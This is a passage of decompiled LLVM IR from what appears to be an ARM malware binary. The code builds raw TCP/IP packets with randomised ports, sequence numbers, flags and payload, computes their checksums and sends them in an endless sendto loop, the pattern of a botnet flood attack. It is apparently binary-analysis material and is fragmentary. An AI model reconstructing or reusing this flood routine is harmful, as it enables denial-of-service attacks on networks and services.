  store i32 %v5_a520, i32* %v3_a524, align 4
  %v0_a528 = load i32, i32* @r8, align 4
  %v1_a528 = add i32 %v0_a528, 8
  %v2_a528 = inttoptr i32 %v1_a528 to i32*
  %v3_a528 = load i32, i32* %v2_a528, align 4
  store i32 %v3_a528, i32* %r1.global-to-local, align 4
  %v1_a52c = and i32 %v3_a528, 16711680
  store i32 %v1_a52c, i32* %r0.global-to-local, align 4
  store i32 %v6_a250, i32* %r2.global-to-local, align 4
  %v5_a544 = call i32 @llvm.bswap.i32(i32 %v3_a528)
  store i32 %v5_a544, i32* %r3.global-to-local, align 4
  %v1_a548 = add i32 %v0_a528, 2
  %v2_a548 = inttoptr i32 %v1_a548 to i16*
  %v3_a548 = load i16, i16* %v2_a548, align 2
  %v4_a548 = zext i16 %v3_a548 to i32
  store i32 %v4_a548, i32* %r1.global-to-local, align 4
  store i32 %v1_a54c, i32* @r7, align 4
  %v0_a550 = load i32, i32* @lr, align 4
  %v1_a550 = trunc i32 %v0_a550 to i16
  %v2_a550 = load i32, i32* %ip.global-to-local, align 4
  %v3_a550 = add i32 %v2_a550, 14
  %v4_a550 = inttoptr i32 %v3_a550 to i16*
  store i16 %v1_a550, i16* %v4_a550, align 2
  %v0_a554 = load i32, i32* %r1.global-to-local, align 4
  %v1_a554 = trunc i32 %v0_a554 to i16
  %v2_a554 = load i32, i32* %ip.global-to-local, align 4
  %v3_a554 = add i32 %v2_a554, 12
  %v4_a554 = inttoptr i32 %v3_a554 to i16*
  store i16 %v1_a554, i16* %v4_a554, align 2
  %v0_a558 = load i32, i32* %r3.global-to-local, align 4
  %v1_a558 = load i32, i32* %ip.global-to-local, align 4
  %v2_a558 = add i32 %v1_a558, 8
  %v3_a558 = inttoptr i32 %v2_a558 to i32*
  store i32 %v0_a558, i32* %v3_a558, align 4
  %v0_a55c = load i32, i32* @r7, align 4
  store i32 %v0_a55c, i32* @r0, align 4
  %v0_a560 = call i32 @malloc()
  store i32 %v0_a560, i32* %r0.global-to-local, align 4
  store i32 %v2_a0dc, i32* %r3.global-to-local, align 4
  %v2_a56c = load i32, i32* @r4, align 4
  %v5_a56c = mul i32 %v2_a56c, 4
  %v6_a56c = add i32 %v5_a56c, %v2_a0dc
  %v7_a56c = inttoptr i32 %v6_a56c to i32*
  store i32 %v0_a560, i32* %v7_a56c, align 4
  %v3_a570 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a570, i32* %r2.global-to-local, align 4
  %v0_a574 = load i32, i32* %r3.global-to-local, align 4
  %v4_a574 = mul i32 %v3_a570, 4
  %v5_a574 = add i32 %v0_a574, %v4_a574
  %v6_a574 = inttoptr i32 %v5_a574 to i32*
  %v7_a574 = load i32, i32* %v6_a574, align 4
  store i32 %v7_a574, i32* @r4, align 4
  %v1_a578 = inttoptr i32 %v7_a574 to i8*
  %v2_a578 = load i8, i8* %v1_a578, align 1
  %tmp103 = urem i8 %v2_a578, 16
  %v1_a57c = zext i8 %tmp103 to i32
  %v1_a580 = or i32 %v1_a57c, 64
  store i32 %v1_a580, i32* %r3.global-to-local, align 4
  %v1_a584 = trunc i32 %v1_a580 to i8
  store i8 %v1_a584, i8* %v1_a578, align 1
  %v0_a588 = load i32, i32* @r4, align 4
  %v1_a588 = inttoptr i32 %v0_a588 to i8*
  %v2_a588 = load i8, i8* %v1_a588, align 1
  %v0_a58c = load i32, i32* @r7, align 4
  %tmp77 = mul i32 %v0_a58c, 256
  %v1_a594 = and i8 %v2_a588, -16
  %v1_a598 = or i8 %v1_a594, 5
  %v1_a59c = and i32 %tmp77, 65280
  %tmp78 = udiv i32 %v0_a58c, 256
  %v4_a5a0 = urem i32 %tmp78, 256
  %v5_a5a0 = or i32 %v4_a5a0, %v1_a59c
  store i32 %v5_a5a0, i32* %r2.global-to-local, align 4
  %v0_a5a4 = load i32, i32* @fp, align 4
  %v1_a5a4 = urem i32 %v0_a5a4, 256
  store i32 %v1_a5a4, i32* %r0.global-to-local, align 4
  store i32 %v1_a15c, i32* %ip.global-to-local, align 4
  %v3_a5ac = udiv i32 %v0_a5a4, 256
  store i32 %v3_a5ac, i32* %r1.global-to-local, align 4
  store i8 %v1_a598, i8* %v1_a588, align 1
  %v0_a5b4 = load i32, i32* %r1.global-to-local, align 4
  %v1_a5b4 = load i32, i32* %r0.global-to-local, align 4
  %v4_a5b4 = mul i32 %v1_a5b4, 256
  %v5_a5b4 = or i32 %v4_a5b4, %v0_a5b4
  store i32 %v5_a5b4, i32* %r1.global-to-local, align 4
  store i32 %v6_a0f4, i32* %r0.global-to-local, align 4
  %v2_a5bc = load i32, i32* @r4, align 4
  %v3_a5bc = add i32 %v2_a5bc, 1
  %v4_a5bc = inttoptr i32 %v3_a5bc to i8*
  store i8 %v5_a114, i8* %v4_a5bc, align 1
  %v0_a5c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_a5c0 = trunc i32 %v0_a5c0 to i16
  %v2_a5c0 = load i32, i32* @r4, align 4
  %v3_a5c0 = add i32 %v2_a5c0, 4
  %v4_a5c0 = inttoptr i32 %v3_a5c0 to i16*
  store i16 %v1_a5c0, i16* %v4_a5c0, align 2
  %v0_a5c4 = load i32, i32* %ip.global-to-local, align 4
  %v2_a5c4 = icmp eq i32 %v0_a5c4, 0
  store i1 %v2_a5c4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_a150, i32* %r1.global-to-local, align 4
  %v0_a5cc = load i32, i32* %r2.global-to-local, align 4
  %v1_a5cc = trunc i32 %v0_a5cc to i16
  %v2_a5cc = load i32, i32* @r4, align 4
  %v3_a5cc = add i32 %v2_a5cc, 2
  %v4_a5cc = inttoptr i32 %v3_a5cc to i16*
  store i16 %v1_a5cc, i16* %v4_a5cc, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  br i1 %v2_a5c4, label %bb80, label %bb79

bb79:                                             ; preds = %dec_label_pc_a4f0
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb80

bb80:                                             ; preds = %dec_label_pc_a4f0, %bb79
  %v0_a5d8 = load i32, i32* %r1.global-to-local, align 4
  %v1_a5d8 = trunc i32 %v0_a5d8 to i8
  %v2_a5d8 = load i32, i32* @r4, align 4
  %v3_a5d8 = add i32 %v2_a5d8, 8
  %v4_a5d8 = inttoptr i32 %v3_a5d8 to i8*
  store i8 %v1_a5d8, i8* %v4_a5d8, align 1
  %v0_a5dc = load i32, i32* %r3.global-to-local, align 4
  %v1_a5dc = trunc i32 %v0_a5dc to i8
  %v2_a5dc = load i32, i32* @r4, align 4
  %v3_a5dc = add i32 %v2_a5dc, 9
  %v4_a5dc = inttoptr i32 %v3_a5dc to i8*
  store i8 %v1_a5dc, i8* %v4_a5dc, align 1
  %v0_a5e0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a5e0, label %bb82, label %bb81

bb81:                                             ; preds = %bb80
  %v1_a5e0 = load i32, i32* %r2.global-to-local, align 4
  %v2_a5e0 = trunc i32 %v1_a5e0 to i16
  %v3_a5e0 = load i32, i32* @r4, align 4
  %v4_a5e0 = add i32 %v3_a5e0, 6
  %v5_a5e0 = inttoptr i32 %v4_a5e0 to i16*
  store i16 %v2_a5e0, i16* %v5_a5e0, align 2
  br label %bb82

bb82:                                             ; preds = %bb80, %bb81
  store i32 ptrtoint (i32* @global_var_2472c.58 to i32), i32* %r2.global-to-local, align 4
  %v2_a5e8 = load i32, i32* @global_var_2472c.58, align 4
  store i32 %v2_a5e8, i32* %r1.global-to-local, align 4
  %v1_a5ec = load i32, i32* @r4, align 4
  %v2_a5ec = add i32 %v1_a5ec, 12
  %v3_a5ec = inttoptr i32 %v2_a5ec to i32*
  store i32 %v2_a5e8, i32* %v3_a5ec, align 4
  %v3_a5f0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a5f0, i32* %r3.global-to-local, align 4
  store i32 %v2_a0cc, i32* %ip.global-to-local, align 4
  %v4_a5f8 = mul i32 %v3_a5f0, 16
  %v5_a5f8 = add i32 %v4_a5f8, %v2_a0cc
  %v6_a5f8 = inttoptr i32 %v5_a5f8 to i32*
  %v7_a5f8 = load i32, i32* %v6_a5f8, align 4
  store i32 %v7_a5f8, i32* %r2.global-to-local, align 4
  store i32 %v5_a5f8, i32* %r3.global-to-local, align 4
  %v1_a604 = load i32, i32* @r4, align 4
  %v2_a604 = add i32 %v1_a604, 16
  %v3_a604 = inttoptr i32 %v2_a604 to i32*
  store i32 %v7_a5f8, i32* %v3_a604, align 4
  %v0_a608 = load i32, i32* %r3.global-to-local, align 4
  %v1_a608 = add i32 %v0_a608, 12
  %v2_a608 = inttoptr i32 %v1_a608 to i16*
  %v3_a608 = load i16, i16* %v2_a608, align 2
  %v4_a608 = zext i16 %v3_a608 to i32
  store i32 %v4_a608, i32* %r0.global-to-local, align 4
  %v1_a60c = add i32 %v0_a608, 8
  %v2_a60c = inttoptr i32 %v1_a60c to i32*
  %v3_a60c = load i32, i32* %v2_a60c, align 4
  store i32 %v3_a60c, i32* %r1.global-to-local, align 4
  %v2_a610 = load i32, i32* @r4, align 4
  %v3_a610 = add i32 %v2_a610, 20
  %v4_a610 = inttoptr i32 %v3_a610 to i16*
  store i16 %v3_a608, i16* %v4_a610, align 2
  %v0_a614 = load i32, i32* @r4, align 4
  %v1_a614 = add i32 %v0_a614, 20
  store i32 %v1_a614, i32* @r8, align 4
  %v1_a618 = add i32 %v0_a614, 33
  %v2_a618 = inttoptr i32 %v1_a618 to i8*
  %v3_a618 = load i8, i8* %v2_a618, align 1
  %v4_a618 = zext i8 %v3_a618 to i32
  store i32 %v4_a618, i32* %r2.global-to-local, align 4
  %v0_a61c = load i32, i32* %r1.global-to-local, align 4
  %v2_a61c = add i32 %v0_a614, 24
  %v3_a61c = inttoptr i32 %v2_a61c to i32*
  store i32 %v0_a61c, i32* %v3_a61c, align 4
  %v0_a620 = load i32, i32* %r2.global-to-local, align 4
  %v1_a620 = or i32 %v0_a620, 1
  store i32 %v1_a620, i32* %r2.global-to-local, align 4
  %v0_a624 = load i32, i32* %r3.global-to-local, align 4
  %v1_a624 = add i32 %v0_a624, 4
  %v2_a624 = inttoptr i32 %v1_a624 to i32*
  %v3_a624 = load i32, i32* %v2_a624, align 4
  store i32 %v3_a624, i32* %r1.global-to-local, align 4
  %v1_a628 = add i32 %v0_a624, 14
  %v2_a628 = inttoptr i32 %v1_a628 to i16*
  %v3_a628 = load i16, i16* %v2_a628, align 2
  %v4_a628 = zext i16 %v3_a628 to i32
  store i32 %v4_a628, i32* %r3.global-to-local, align 4
  %v1_a62c = trunc i32 %v1_a620 to i8
  %v2_a62c = load i32, i32* @r8, align 4
  %v3_a62c = add i32 %v2_a62c, 13
  %v4_a62c = inttoptr i32 %v3_a62c to i8*
  store i8 %v1_a62c, i8* %v4_a62c, align 1
  %v0_a630 = load i32, i32* %r3.global-to-local, align 4
  %v1_a630 = trunc i32 %v0_a630 to i16
  %v2_a630 = load i32, i32* @r8, align 4
  %v3_a630 = add i32 %v2_a630, 2
  %v4_a630 = inttoptr i32 %v3_a630 to i16*
  store i16 %v1_a630, i16* %v4_a630, align 2
  %v0_a634 = load i32, i32* @r8, align 4
  %v1_a634 = add i32 %v0_a634, 12
  %v2_a634 = inttoptr i32 %v1_a634 to i8*
  %v3_a634 = load i8, i8* %v2_a634, align 1
  %v4_a634 = zext i8 %v3_a634 to i32
  store i32 %v4_a634, i32* %r3.global-to-local, align 4
  %v1_a638 = add i32 %v0_a634, 13
  %v2_a638 = inttoptr i32 %v1_a638 to i8*
  %v3_a638 = load i8, i8* %v2_a638, align 1
  %v4_a638 = zext i8 %v3_a638 to i32
  %tmp104 = urem i8 %v3_a634, 16
  %v1_a63c = zext i8 %tmp104 to i32
  %v1_a640 = or i32 %v1_a63c, 128
  store i32 %v1_a640, i32* %r3.global-to-local, align 4
  %v1_a644 = or i32 %v4_a638, 16
  store i32 %v1_a644, i32* %r2.global-to-local, align 4
  %v0_a648 = load i32, i32* %r1.global-to-local, align 4
  %v2_a648 = add i32 %v0_a634, 8
  %v3_a648 = inttoptr i32 %v2_a648 to i32*
  store i32 %v0_a648, i32* %v3_a648, align 4
  %v0_a64c = load i32, i32* %r3.global-to-local, align 4
  %v1_a64c = trunc i32 %v0_a64c to i8
  %v2_a64c = load i32, i32* @r8, align 4
  %v3_a64c = add i32 %v2_a64c, 12
  %v4_a64c = inttoptr i32 %v3_a64c to i8*
  store i8 %v1_a64c, i8* %v4_a64c, align 1
  %v0_a650 = load i32, i32* %r2.global-to-local, align 4
  %v1_a650 = trunc i32 %v0_a650 to i8
  %v2_a650 = load i32, i32* @r8, align 4
  %v3_a650 = add i32 %v2_a650, 13
  %v4_a650 = inttoptr i32 %v3_a650 to i8*
  store i8 %v1_a650, i8* %v4_a650, align 1
  %v0_a654 = call i32 @rand_next()
  %v1_a654 = trunc i32 %v0_a654 to i16
  store i32 %v0_a654, i32* %r0.global-to-local, align 4
  store i32 %v1_a198, i32* %r1.global-to-local, align 4
  %v0_a65c = load i32, i32* @r8, align 4
  %v1_a65c = add i32 %v0_a65c, 13
  %v2_a65c = inttoptr i32 %v1_a65c to i8*
  %v3_a65c = load i8, i8* %v2_a65c, align 1
  %v4_a65c = zext i8 %v3_a65c to i32
  store i32 %v1_a660, i32* %r2.global-to-local, align 4
  %v1_a664 = and i32 %v4_a65c, 223
  %v5_a668 = or i32 %v1_a664, %v4_a668
  store i32 %v5_a668, i32* %r3.global-to-local, align 4
  %v1_a66c = trunc i32 %v5_a668 to i8
  store i8 %v1_a66c, i8* %v2_a65c, align 1
  store i32 %v1_a1b8, i32* %ip.global-to-local, align 4
  %v0_a674 = load i32, i32* @r8, align 4
  %v1_a674 = add i32 %v0_a674, 13
  %v2_a674 = inttoptr i32 %v1_a674 to i8*
  %v3_a674 = load i8, i8* %v2_a674, align 1
  %v4_a674 = zext i8 %v3_a674 to i32
  store i32 %v1_a678, i32* %r3.global-to-local, align 4
  %v1_a67c = and i32 %v4_a674, 239
  %v5_a680 = or i32 %v1_a67c, %v4_a680
  store i32 %v5_a680, i32* %r2.global-to-local, align 4
  %v1_a684 = trunc i32 %v5_a680 to i8
  store i8 %v1_a684, i8* %v2_a674, align 1
  store i32 %v1_a1d8, i32* %r1.global-to-local, align 4
  %v0_a68c = load i32, i32* @r8, align 4
  %v1_a68c = add i32 %v0_a68c, 13
  %v2_a68c = inttoptr i32 %v1_a68c to i8*
  %v3_a68c = load i8, i8* %v2_a68c, align 1
  %v4_a68c = zext i8 %v3_a68c to i32
  store i32 %v1_a690, i32* %r2.global-to-local, align 4
  %v1_a694 = and i32 %v4_a68c, 247
  %v5_a698 = or i32 %v1_a694, %v4_a698
  store i32 %v5_a698, i32* %r3.global-to-local, align 4
  %v1_a69c = trunc i32 %v5_a698 to i8
  store i8 %v1_a69c, i8* %v2_a68c, align 1
  store i32 %v1_a1f8, i32* %ip.global-to-local, align 4
  %v0_a6a4 = load i32, i32* @r8, align 4
  %v1_a6a4 = add i32 %v0_a6a4, 13
  %v2_a6a4 = inttoptr i32 %v1_a6a4 to i8*
  %v3_a6a4 = load i8, i8* %v2_a6a4, align 1
  %v4_a6a4 = zext i8 %v3_a6a4 to i32
  store i32 %v1_a6a8, i32* %r3.global-to-local, align 4
  %v1_a6ac = and i32 %v4_a6a4, 251
  %v5_a6b0 = or i32 %v1_a6ac, %v4_a6b0
  store i32 %v5_a6b0, i32* %r2.global-to-local, align 4
  %v1_a6b4 = trunc i32 %v5_a6b0 to i8
  store i8 %v1_a6b4, i8* %v2_a6a4, align 1
  store i32 %v1_a218, i32* %r1.global-to-local, align 4
  %v0_a6bc = load i32, i32* @r8, align 4
  %v1_a6bc = add i32 %v0_a6bc, 13
  %v2_a6bc = inttoptr i32 %v1_a6bc to i8*
  %v3_a6bc = load i8, i8* %v2_a6bc, align 1
  %v4_a6bc = zext i8 %v3_a6bc to i32
  store i32 %v1_a6c0, i32* %r2.global-to-local, align 4
  %v1_a6c4 = and i32 %v4_a6bc, 253
  %v4_a6c8 = or i32 %v1_a6c4, %v3_a6c8
  store i32 %v4_a6c8, i32* %r3.global-to-local, align 4
  %v1_a6cc = trunc i32 %v4_a6c8 to i8
  store i8 %v1_a6cc, i8* %v2_a6bc, align 1
  store i32 %v1_a238, i32* %ip.global-to-local, align 4
  %v0_a6d4 = load i32, i32* @r8, align 4
  %v1_a6d4 = add i32 %v0_a6d4, 13
  %v2_a6d4 = inttoptr i32 %v1_a6d4 to i8*
  %v3_a6d4 = load i8, i8* %v2_a6d4, align 1
  %v4_a6d4 = zext i8 %v3_a6d4 to i32
  %v1_a6dc = and i32 %v4_a6d4, 254
  store i32 %v1_a6dc, i32* %r2.global-to-local, align 4
  %v2_a6e0 = or i32 %v1_a6dc, %v1_a6d8
  store i32 %v2_a6e0, i32* %r3.global-to-local, align 4
  %v1_a6e4 = trunc i32 %v2_a6e0 to i8
  store i8 %v1_a6e4, i8* %v2_a6d4, align 1
  %v3_a6e8 = load i32, i32* @r8, align 4
  %v4_a6e8 = add i32 %v3_a6e8, 14
  %v5_a6e8 = inttoptr i32 %v4_a6e8 to i16*
  store i16 %v1_a654, i16* %v5_a6e8, align 2
  store i32 %v6_a250, i32* %r1.global-to-local, align 4
  %v0_a6f0 = load i32, i32* @r4, align 4
  %v1_a6f0 = add i32 %v0_a6f0, 40
  store i32 %v1_a6f0, i32* %r0.global-to-local, align 4
  %v2_a6f4 = inttoptr i32 %v1_a6f0 to i16*
  %v3_a6f4 = call i32 @rand_str(i16* %v2_a6f4, i32 %v6_a250)
  store i32 %v3_a6f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a448

dec_label_pc_a6fc:                                ; preds = %dec_label_pc_a2bc
  store i32 %v6_a250, i32* %r1.global-to-local, align 4
  %.pre = add i32 %v6_a250, 40
  br label %dec_label_pc_a70c

dec_label_pc_a70c:                                ; preds = %dec_label_pc_a45c, %dec_label_pc_a6fc
  %storemerge6.pre-phi = phi i32 [ %v1_a54c, %dec_label_pc_a45c ], [ %.pre, %dec_label_pc_a6fc ]
  %v0_a72026 = phi i32 [ %v1_a450, %dec_label_pc_a45c ], [ 0, %dec_label_pc_a6fc ]
  store i32 %storemerge6.pre-phi, i32* @r7, align 4
  %storemerge4 = mul i32 %v6_a250, 65536
  %storemerge = add i32 %v6_a250, 20
  store i32 %storemerge, i32* @sl, align 4
  %v1_a70c = add i32 %storemerge4, 1310720
  store i32 %v1_a70c, i32* %r2.global-to-local, align 4
  %tmp83 = udiv i32 %v1_a70c, 256
  %v3_a714 = and i32 %tmp83, 65280
  store i32 %v3_a714, i32* %r3.global-to-local, align 4
  %v4_a718 = udiv i32 %v1_a70c, 16777216
  %v5_a718 = or i32 %v3_a714, %v4_a718
  store i32 %v5_a718, i32* @r8, align 4
  %v2_a844 = icmp eq i32 %v1_a270, 0
  br label %dec_label_pc_a71c

dec_label_pc_a71c:                                ; preds = %dec_label_pc_a71c, %dec_label_pc_a828, %dec_label_pc_a70c
  %v0_a720 = phi i32 [ %v0_a72026, %dec_label_pc_a70c ], [ 0, %dec_label_pc_a828 ], [ 0, %dec_label_pc_a71c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a720 = icmp eq i32 %v0_a720, 0
  store i1 %v2_a720, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a720, label %dec_label_pc_a71c, label %dec_label_pc_a72c

dec_label_pc_a72c:                                ; preds = %dec_label_pc_a71c, %dec_label_pc_a828
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a730

dec_label_pc_a730:                                ; preds = %dec_label_pc_a758, %dec_label_pc_a72c
  %v1_a738 = phi i32 [ %v1_a818, %dec_label_pc_a758 ], [ 0, %dec_label_pc_a72c ]
  store i32 %v2_a0dc, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  %v4_a738 = mul i32 %v1_a738, 4
  %v5_a738 = add i32 %v4_a738, %v2_a0dc
  %v6_a738 = inttoptr i32 %v5_a738 to i32*
  %v7_a738 = load i32, i32* %v6_a738, align 4
  store i32 %v7_a738, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_a740 = load i32, i32* @fp, align 4
  %v9_a740 = icmp eq i32 %v0_a740, 65535
  store i1 %v9_a740, i1* %cpsr_z.global-to-local, align 1
  %v1_a744 = add i32 %v7_a738, 20
  store i32 %v1_a744, i32* @r5, align 4
  br i1 %v9_a740, label %dec_label_pc_a83c, label %dec_label_pc_a74c

dec_label_pc_a74c:                                ; preds = %dec_label_pc_a730
  store i32 %v1_a270, i32* %r3.global-to-local, align 4
  store i1 %v2_a844, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a844, label %dec_label_pc_a758, label %dec_label_pc_a850

dec_label_pc_a758:                                ; preds = %dec_label_pc_a74c, %dec_label_pc_a83c, %dec_label_pc_a850
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_a75c = load i32, i32* @r4, align 4
  %v3_a75c = add i32 %v2_a75c, 10
  %v4_a75c = inttoptr i32 %v3_a75c to i16*
  store i16 0, i16* %v4_a75c, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_a764 = load i32, i32* @r4, align 4
  store i32 %v0_a764, i32* @r0, align 4
  %v2_a768 = call i32 @checksum_generic(i32 %v0_a764, i32 20)
  %v3_a768 = trunc i32 %v2_a768 to i16
  store i32 %v2_a768, i32* %r0.global-to-local, align 4
  %v3_a76c = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_a0cc, i32* %r2.global-to-local, align 4
  %v3_a774 = mul i32 %v3_a76c, 16
  %v2_a778 = add i32 %v3_a774, %v2_a0cc
  store i32 %v2_a778, i32* %r1.global-to-local, align 4
  %v1_a77c = add i32 %v2_a778, 4
  %v2_a77c = inttoptr i32 %v1_a77c to i32*
  %v3_a77c = load i32, i32* %v2_a77c, align 4
  %v3_a780 = mul i32 %v3_a77c, 65536
  store i32 %v3_a780, i32* %ip.global-to-local, align 4
  %tmp85 = mul i32 %v3_a77c, 256
  %v1_a788 = and i32 %tmp85, 65280
  %tmp86 = udiv i32 %v3_a77c, 256
  %v4_a78c = urem i32 %tmp86, 256
  %v5_a78c = or i32 %v4_a78c, %v1_a788
  store i32 %v5_a78c, i32* %r3.global-to-local, align 4
  %v1_a790 = add i32 %v3_a77c, 1
  store i32 %v1_a790, i32* %r2.global-to-local, align 4
  store i32 %v1_a790, i32* %v2_a77c, align 4
  %v0_a798 = load i32, i32* %r3.global-to-local, align 4
  %v1_a798 = load i32, i32* @r5, align 4
  %v2_a798 = add i32 %v1_a798, 4
  %v3_a798 = inttoptr i32 %v2_a798 to i32*
  store i32 %v0_a798, i32* %v3_a798, align 4
  %v0_a79c = load i32, i32* %r1.global-to-local, align 4
  %v1_a79c = add i32 %v0_a79c, 8
  %v2_a79c = inttoptr i32 %v1_a79c to i32*
  %v3_a79c = load i32, i32* %v2_a79c, align 4
  %tmp87 = mul i32 %v3_a79c, 256
  %v1_a7a8 = and i32 %tmp87, 65280
  %tmp88 = udiv i32 %v3_a79c, 256
  %v4_a7ac = urem i32 %tmp88, 256
  %v5_a7ac = or i32 %v4_a7ac, %v1_a7a8
  %v1_a7b0 = load i32, i32* @r5, align 4
  %v2_a7b0 = add i32 %v1_a7b0, 8
  %v3_a7b0 = inttoptr i32 %v2_a7b0 to i32*
  store i32 %v5_a7ac, i32* %v3_a7b0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_a7b8 = load i32, i32* @r4, align 4
  %v4_a7b8 = add i32 %v3_a7b8, 10
  %v5_a7b8 = inttoptr i32 %v4_a7b8 to i16*
  store i16 %v3_a768, i16* %v5_a7b8, align 2
  %v0_a7bc = load i32, i32* @r5, align 4
  store i32 %v0_a7bc, i32* @r1, align 4
  %v0_a7c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_a7c0 = trunc i32 %v0_a7c0 to i16
  %v3_a7c0 = add i32 %v0_a7bc, 16
  %v4_a7c0 = inttoptr i32 %v3_a7c0 to i16*
  store i16 %v1_a7c0, i16* %v4_a7c0, align 2
  %v0_a7c4 = load i32, i32* @r8, align 4
  store i32 %v0_a7c4, i32* %r2.global-to-local, align 4
  %v0_a7c8 = load i32, i32* @sl, align 4
  store i32 %v0_a7c8, i32* %r3.global-to-local, align 4
  %v0_a7cc = load i32, i32* @r4, align 4
  store i32 %v0_a7cc, i32* %r0.global-to-local, align 4
  %v4_a7d0 = call i32 @checksum_tcpudp(i32 %v0_a7cc, i32 %v0_a7bc, i32 %v0_a7c4, i32 %v0_a7c8)
  %v5_a7d0 = trunc i32 %v4_a7d0 to i16
  store i32 %v4_a7d0, i32* %r0.global-to-local, align 4
  %v3_a7d4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a7d4, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v3_a7dc = mul i32 %v3_a7d4, 32
  store i32 %v3_a7dc, i32* %lr.global-to-local, align 4
  %v3_a7e0 = load i32, i32* @r5, align 4
  %v4_a7e0 = add i32 %v3_a7e0, 16
  %v5_a7e0 = inttoptr i32 %v4_a7e0 to i16*
  store i16 %v5_a7d0, i16* %v5_a7e0, align 2
  %v0_a7e4 = load i32, i32* %lr.global-to-local, align 4
  %v1_a7e4 = load i32, i32* %r3.global-to-local, align 4
  %tmp105 = mul i32 %v1_a7e4, -8
  %v5_a7e4 = add i32 %v0_a7e4, %tmp105
  store i32 %v5_a7e4, i32* %lr.global-to-local, align 4
  %v0_a7e8 = load i32, i32* @r5, align 4
  %v1_a7e8 = add i32 %v0_a7e8, 2
  %v2_a7e8 = inttoptr i32 %v1_a7e8 to i16*
  %v3_a7e8 = load i16, i16* %v2_a7e8, align 2
  %v4_a7e8 = zext i16 %v3_a7e8 to i32
  store i32 %v4_a7e8, i32* @r5, align 4
  %v1_a7ec = load i32, i32* %ip.global-to-local, align 4
  %v2_a7ec = add i32 %v1_a7ec, %v5_a7e4
  store i32 %v2_a7ec, i32* @lr, align 4
  %v3_a7f0 = add i32 %v2_a7ec, 2
  %v4_a7f0 = inttoptr i32 %v3_a7f0 to i16*
  store i16 %v3_a7e8, i16* %v4_a7f0, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_a7fc = load i32, i32* @r4, align 4
  store i32 %v0_a7fc, i32* %r1.global-to-local, align 4
  %v0_a800 = load i32, i32* @sb, align 4
  store i32 %v0_a800, i32* %r0.global-to-local, align 4
  %v0_a804 = load i32, i32* @r7, align 4
  store i32 %v0_a804, i32* %r2.global-to-local, align 4
  %v0_a808 = load i32, i32* @lr, align 4
  %v6_a810 = call i32 @__libc_sendto(i32 %v0_a800, i32 %v0_a7fc, i32 %v0_a804, i32 16384, i32 %v0_a808, i32 16)
  %v3_a814 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a814, i32* %r3.global-to-local, align 4
  %v1_a818 = add i32 %v3_a814, 1
  store i32 %v1_a818, i32* %r0.global-to-local, align 4
  %v0_a81c = load i32, i32* @r6, align 4
  %v9_a81c = icmp eq i32 %v0_a81c, %v1_a818
  store i1 %v9_a81c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a818, i32* %stack_var_-44, align 4
  %v8_a824 = icmp sgt i32 %v0_a81c, %v1_a818
  br i1 %v8_a824, label %dec_label_pc_a730, label %dec_label_pc_a828

dec_label_pc_a828:                                ; preds = %dec_label_pc_a758
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a82c = icmp eq i32 %v0_a81c, 0
  store i1 %v2_a82c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a82c, label %dec_label_pc_a71c, label %dec_label_pc_a72c

dec_label_pc_a83c:                                ; preds = %dec_label_pc_a730
  %v0_a83c = call i32 @rand_next()
  %v1_a83c = trunc i32 %v0_a83c to i16
  store i32 %v0_a83c, i32* %r0.global-to-local, align 4
  store i32 %v1_a270, i32* %r3.global-to-local, align 4
  store i1 %v2_a844, i1* %cpsr_z.global-to-local, align 1
  %v3_a848 = load i32, i32* @r4, align 4
  %v4_a848 = add i32 %v3_a848, 4
  %v5_a848 = inttoptr i32 %v4_a848 to i16*
  store i16 %v1_a83c, i16* %v5_a848, align 2
  br i1 %v2_a844, label %dec_label_pc_a758, label %dec_label_pc_a83c.dec_label_pc_a850_crit_edge

dec_label_pc_a83c.dec_label_pc_a850_crit_edge:    ; preds = %dec_label_pc_a83c
  %v0_a850.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_a850

dec_label_pc_a850:                                ; preds = %dec_label_pc_a83c.dec_label_pc_a850_crit_edge, %dec_label_pc_a74c
  %v0_a850 = phi i32 [ %v0_a850.pre, %dec_label_pc_a83c.dec_label_pc_a850_crit_edge ], [ %v7_a738, %dec_label_pc_a74c ]
  %v1_a850 = add i32 %v0_a850, 40
  store i32 %v1_a850, i32* %r0.global-to-local, align 4
  store i32 %v6_a250, i32* %r1.global-to-local, align 4
  %v2_a858 = inttoptr i32 %v1_a850 to i16*
  %v3_a858 = call i32 @rand_str(i16* %v2_a858, i32 %v6_a250)
  store i32 %v3_a858, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a758

; uselistorder directives
  uselistorder i32 %v0_a83c, { 1, 0 }
  uselistorder i32 %v1_a818, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_a7e4, { 1, 0 }
  uselistorder i32 %v4_a7d0, { 1, 0 }
  uselistorder i32 %v3_a79c, { 1, 0 }
  uselistorder i32 %v3_a77c, { 3, 2, 0, 1 }
  uselistorder i32 %v2_a768, { 1, 0 }
